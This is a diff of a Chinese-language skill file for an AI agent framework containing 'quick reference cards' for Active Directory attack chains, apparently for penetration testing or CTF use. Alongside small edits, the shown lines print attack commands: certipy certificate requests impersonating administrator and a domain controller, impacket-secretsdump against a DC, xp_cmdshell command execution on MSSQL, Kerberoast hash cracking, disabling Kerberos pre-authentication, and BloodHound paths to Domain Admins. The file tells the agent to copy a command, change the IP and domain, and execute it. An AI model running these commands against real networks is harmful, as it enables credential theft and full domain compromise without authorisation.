@@ -1,6 +1,6 @@
 ---
 name: 'quickref-cards'
-description: '\U0001F534 高频攻击链一键参考卡片 — 每条含前置验证+具体实例+常见错误+成功输出样例。卡壳时第一站。'
+description: '🔴 高频攻击链一键参考卡片 — 每条含前置验证+具体实例+常见错误+成功输出样例。卡壳时第一站。'
 metadata: { domain: meta, tier: T1 }
 ---
 > 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
@@ -10,7 +10,7 @@ metadata: { domain: meta, tier: T1 }
 > 🔴 **卡壳第一站：CTRL+F 搜攻击名 → 照抄命令 → 改 IP/域/用户 → 执行。**
 > 每张卡片 = 前置验证 + 攻击命令(抽象+具体实例) + 成功输出样例 + 常见失败→解决
 > 📌 **bloodyAD**: `bloodyAD -H DC_IP -d DOMAIN -u USER -p PASS <category> <cmd> [args]`
-> 📌 **impacket**: `impacket-xxx` = `python3 /path/to/xxx.py`
+> 📌 **impacket**: `impacket-*` 命令直接执行（已入 PATH）
 
 ---
 
@@ -74,6 +74,8 @@ bloodyAD -H DC_IP -d dom -u user -p pass get object "CN=COMP01,CN=Computers,DC=d
 | `KRB_AP_ERR_SKEW` | 时钟偏差 | `ntpdate -b DC_IP` |
 | `constrained delegation (S4U2Proxy) failed` | ST 不含 TGT | 合并 TGT+ST ccache 或直接传密码 |
 | bloodyAD `add rbcd` access denied | 无 Write 权限 | 回到前置验证步骤 1 |
+
+📌 完整版见 rbcd-spnless 卡
 
 ---
 
@@ -227,6 +229,8 @@ certipy req ... -upn 'administrator@corp.local' -sid S-1-5-21-1234567890-1234567
 | `The NETBIOS connection with the remote host is not available` | -target 不正确 | 确认 CA 服务器 FQDN |
 | certipy req 成功但 certipy auth 失败 | UPN-SID 不匹配 | 加 `-sid <DomainSID>-500` |
 
+📌 完整版见 adcs-attack-chain 卡
+
 ---
 
 ## Card 5: ADCS ESC4 (改模板 ACL → ESC1)
@@ -256,6 +260,8 @@ certipy template -template 'VULN_TPL' -u 'u@d' -p 'p' -dc-ip DC -write-configura
 |------|------|------|
 | certipy template `access denied` | 无模板写权限 | 确认 certipy find 输出含 ESC4 |
 | 第3步拿不到证书 | 模板未开启 ENROLLEE_SUPPLIES_SUBJECT | 手动 `set object` 改 mspki-certificate-name-flag |
+
+📌 完整版见 adcs-attack-chain 卡
 
 ---
 
@@ -297,6 +303,8 @@ certipy auth -pfx 'dc01.pfx' -dc-ip 10.10.10.10 -username 'DC01$' -domain 'corp.
 # 成功输出: [*] Got hash for 'DC01$': <NT>:<LM>
 impacket-secretsdump -k -no-pass 'corp.local/DC01$@DC01.corp.local'
 ```
+
+📌 完整版见 adcs-attack-chain 卡
 
 ---
 
@@ -358,6 +366,8 @@ SQL> EXEC xp_cmdshell 'type C:\Windows\Temp\out.txt';  # 或用 BULK INSERT 读�
 | `xp_cmdshell` blocked / not found | 被禁用或删除 | 尝试 OLE Automation (路径E) |
 | 命令执行无回显 (只有 NULL) | xp_cmdshell 输出限制 | `INSERT INTO #tmp EXEC xp_cmdshell 'cmd'; SELECT * FROM #tmp` |
 | `EXECUTE AS LOGIN` 失败 | 无 IMPERSONATE 权限 | 先查: `SELECT * FROM sys.server_permissions WHERE permission_name='IMPERSONATE'` |
+
+📌 完整版见 mssql-attack-chain 卡
 
 ---
 
@@ -811,6 +821,8 @@ hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
 # bloodyAD -H DC -d dom -u user -p pass add uac target -f DONT_REQ_PREAUTH
 ```
 
+📌 完整版见 lateral-movement 卡
+
 ---
 
 ## Card 17: BloodHound 采集与导入
@@ -862,6 +874,8 @@ bloodhound-ce
 # 找机器到机器的 Session: MATCH (c:Computer)-[:HasSession]->(u:User) RETURN c,u
 # 最短路径到 DA: MATCH p=shortestPath((s:User {name:'JSMITH@DOM.LOCAL'})-[r*1..]->(t:Group {name:'DOMAIN ADMINS@DOM.LOCAL'})) RETURN p
 ```
+
+📌 完整版见 lateral-movement 卡
 
 ---
 
